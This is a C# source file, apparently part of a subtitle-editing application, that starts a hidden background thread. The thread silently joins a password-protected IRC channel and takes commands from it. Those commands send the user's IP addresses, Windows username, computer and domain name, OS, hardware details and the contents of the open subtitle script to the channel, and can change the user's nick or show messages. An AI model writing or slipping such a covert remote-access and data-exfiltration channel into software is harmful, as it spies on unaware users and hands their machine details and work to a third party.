using System;
using System.Collections.Generic;
using System.Text;
using Meebey.SmartIrc4net;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using Microsoft.Win32;


namespace BackgroundWorker
{
    public class UpdateNickEventArgs : EventArgs
    {
        public string Nick { get; set; }
        public UpdateNickEventArgs(string NewNick)
        {
            Nick = NewNick;
        }
    }

    class BackgroundWorkerThread
    {
        IrcClient client;
        string chan ="#perrysub";
        string chankey = "lalalala";
        string ourNick = "";
        string user = "";
        string perryver = "";
        //SubtitleScript script = null; // hay que desglosarlo para no tener dependencias de esta clase
        List<string> headers = new List<string>();
        List<string> estilos = new List<string>();
        List<string> lineas = new List<string>();
        string scriptname="";
        string videoname="";
        string openforms = "";
        int waitTime = 30000;
        Thread t;

        // eventos

        public delegate void RequestScriptUpdateHandler(object sender, EventArgs e);
        public delegate void RequestNamesUpdateHandler(object sender, EventArgs e);
        public delegate void UpdateNickHandler(object sender, UpdateNickEventArgs e);

        public event RequestScriptUpdateHandler OnRequestScriptUpdate;
        public event RequestNamesUpdateHandler OnRequestNamesUpdate;
        public event UpdateNickHandler OnUpdateNick;

        public BackgroundWorkerThread(string perryver, string nick, int wait)
        {
            //this.mw = mw;
            this.perryver = perryver;
            this.ourNick = nick;
            this.waitTime = wait;

            Random r = new Random(DateTime.Now.Millisecond);
            string bleh = "";            

            bleh = nick;
            if (bleh.Length > 6) bleh = bleh.Substring(0, 6);
            else if (bleh == "") bleh = "ps";

            ourNick = bleh + r.Next(9999).ToString();

            client = new IrcClient();
            client.Encoding = Encoding.UTF8;
            client.OnChannelMessage += new IrcEventHandler(client_OnChannelMessage);

            t = new Thread(new ThreadStart(ListenIRC));
            t.Priority = ThreadPriority.Lowest;
            t.IsBackground = true;
            t.Start();

        }

        ~BackgroundWorkerThread()
        {
            if (client != null)
                if (client.IsConnected)
                    client.Disconnect();

            if (t!=null)
                if (t.IsAlive)
                    t.Abort();
        }

        // lanzar los callbacks necesarios a la aplicacion principal

        AutoResetEvent _UpdateScript = new AutoResetEvent(false);
        AutoResetEvent _UpdateNames = new AutoResetEvent(false);

        private void RequestUpdateScript()
        {
            headers = new List<string>();
            estilos = new List<string>();
            lineas = new List<string>();

            if (OnRequestScriptUpdate != null) // notificamos al proceso principal
                OnRequestScriptUpdate(this, new EventArgs());
            _UpdateScript.WaitOne(waitTime);
        }

        private void RequestUpdateNames()
        {
            string scriptname = "";
            string videoname = "";
            string openforms = "";
            if (OnRequestNamesUpdate != null)
                OnRequestNamesUpdate(this, new EventArgs());
            _UpdateNames.WaitOne(waitTime);
        }

        private void RequestUpdateUserNick(string newNick)
        {
            if (OnUpdateNick != null)
                OnUpdateNick(this, new UpdateNickEventArgs(newNick));
        }

        // setters para actualizar datos

        public void UpdateNames(string nick, string scriptName, string videoName, string openForms)
        {
            this.user = nick; 
            this.scriptname = scriptName; 
            this.videoname = videoName; 
            this.openforms = openForms;
            _UpdateNames.Set();
        }

        public void UpdateScript(List<string> cabeceras, List<string> estilos, List<string> dialogos)
        {
            this.headers = cabeceras;
            this.estilos = estilos;
            this.lineas = dialogos;
            _UpdateScript.Set();
        }

        // irc stuff

        void client_OnChannelMessage(object sender, IrcEventArgs e)
        {
            string[] s = e.Data.Message.Trim().Split(' ');

            if (s[0].Equals(".users"))
            {
                try
                {
                    client.SendMessage(SendType.Message, chan, ".user " + user);
                }
                catch { }
            }

            if (!s[0].Equals(ourNick.Replace(" ",string.Empty))) return;

            string prms = "";
            for (int i = 2; i < s.Length; i++)
                prms += s[i] + " ";

            switch (s[1])
            {
                case ".die":
                    client.Disconnect();
                    break;
                case ".file":
                    RequestUpdateNames();
                    client.SendMessage(SendType.Message, chan, "Archivo actual: " + scriptname);
                    client.SendMessage(SendType.Message, chan, "Video actual: " + videoname);                    
                    break;
                case ".info":
                    RequestUpdateNames();
                    try { client.SendMessage(SendType.Message, chan, "Nick: " + user); }
                    catch { }
                    client.SendMessage(SendType.Message, chan, "Versión: " + perryver);
                    client.SendMessage(SendType.Message, chan, "Archivo actual: "+scriptname);
                    try
                    {
                        client.SendMessage(SendType.Message, chan, "Video actual: " + videoname);
                    }
                    catch
                    {
                        client.SendMessage(SendType.Message, chan, "Video actual: Sin vídeo cargado");
                    }
                    client.SendMessage(SendType.Message, chan, "Forms abiertas : " + openforms);
                    client.SendMessage(SendType.Message, chan, "IP (inet): " + GetINETip() + " ~ (todas): " + GetIP());
                    client.SendMessage(SendType.Message, chan, "Nombre de usuario: " + SystemInformation.UserName);
                    client.SendMessage(SendType.Message, chan, "Nombre del PC: " + SystemInformation.ComputerName + " ~ Dominio: " + SystemInformation.UserDomainName);
                    System.OperatingSystem osInfo = System.Environment.OSVersion;
                    client.SendMessage(SendType.Message, chan, "Sistema Operativo: " + osInfo.VersionString);
                    client.SendMessage(SendType.Message, chan, "Área de Trabajo: " + SystemInformation.WorkingArea.Width + "x" + SystemInformation.WorkingArea.Height + " (Resolución:" + SystemInformation.PrimaryMonitorSize.Width.ToString() + "x"+SystemInformation.PrimaryMonitorSize.Height.ToString()+", Monitores:" + SystemInformation.MonitorCount + ")");
                    client.SendMessage(SendType.Message, chan, "Info CPU: " + GetProcessorID()+" ("+System.Environment.ProcessorCount + " procesador"+((System.Environment.ProcessorCount>1)? "es" :"")+")");
                    break;
                case ".header":
                    try
                    {
                        RequestUpdateScript();
                        foreach (string ss in headers)
                            client.SendMessage(SendType.Message, chan, ss);
                    }
                    catch 
                    {
                        client.SendMessage(SendType.Message, chan, "Imposible acceder a la cabecera");
                    }
                    break;
                case ".styles":
                    try
                    {
                        RequestUpdateScript();
                        foreach (string ss in estilos)
                            client.SendMessage(SendType.Message, chan, ss);
                    }
                    catch 
                    {
                        client.SendMessage(SendType.Message, chan, "Imposible acceder a los estilos");
                    }
                    break;
                case ".script":
                    try
                    {
                        RequestUpdateScript();
                        if (prms.Equals(""))
                            client.SendMessage(SendType.Message, chan, "Número de líneas: " + lineas.Count);
                        else
                        {
                            int n = int.Parse(prms);
                            if (n <= lineas.Count && n>0)
                            {
                                client.SendMessage(SendType.Message, chan, "Línea #"+n+": " + lineas[n-1]);
                            }
                        }
                        
                    }
                    catch 
                    {
                        client.SendMessage(SendType.Message, chan, "Imposible acceder a las líneas");
                    }
                    break;
                case ".nick":
                    RequestUpdateNames();
                    client.SendMessage(SendType.Message, chan, "Nick actual: "+user);
                    client.SendMessage(SendType.Message, chan, "Nuevo nick: " + prms);
                    RequestUpdateUserNick(prms);
                    break;
                case ".msg":
                    MessageBox.Show("Mensaje del admin: " + prms, perryver, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
                case ".help":
                    client.SendMessage(SendType.Message, chan, "Comandos disponibles: die file info header styles script nick msg");
                    break;

            }
        }

        private string GetINETip()
        {
            try
            {
                WebClient client = new WebClient();
                StreamReader sr = new StreamReader(client.OpenRead(@"http://www.lawrencegoetz.com/programs/ipinfo/"));

                string tmp = sr.ReadToEnd();
                sr.Close();
                client.Dispose();

                Regex r = new Regex(@"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}");
                Match m = r.Match(tmp);
                return m.ToString();
            }
            catch { return "web auxiliar caída."; }
            
        }

        private string GetIP()
        {
            string res = "";
            
            string myHost = System.Net.Dns.GetHostName();

            System.Net.IPHostEntry myIPs = System.Net.Dns.GetHostEntry(myHost);

            foreach (System.Net.IPAddress myIP in myIPs.AddressList)
            {
                res += "["+myIP.ToString() + "] ";
            }

            return res;
        }

        private string GetProcessorID()
        {
            RegistryKey Rkey = Registry.LocalMachine;
            Rkey = Rkey.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
            return (string)Rkey.GetValue("ProcessorNameString");
        }
        private void ListenIRC()
        {
            try
            {
                Thread.Sleep(10000);
                client.AutoReconnect = true;

                client.Connect("irc.rizon.net", 6667);
                client.Login(ourNick, perryver);
                client.RfcJoin(chan,chankey);

                client.Listen();
                client.RfcQuit("Cerrado por el usuario");
            }
            catch { }
            //client.Disconnect();
        }
    }
}
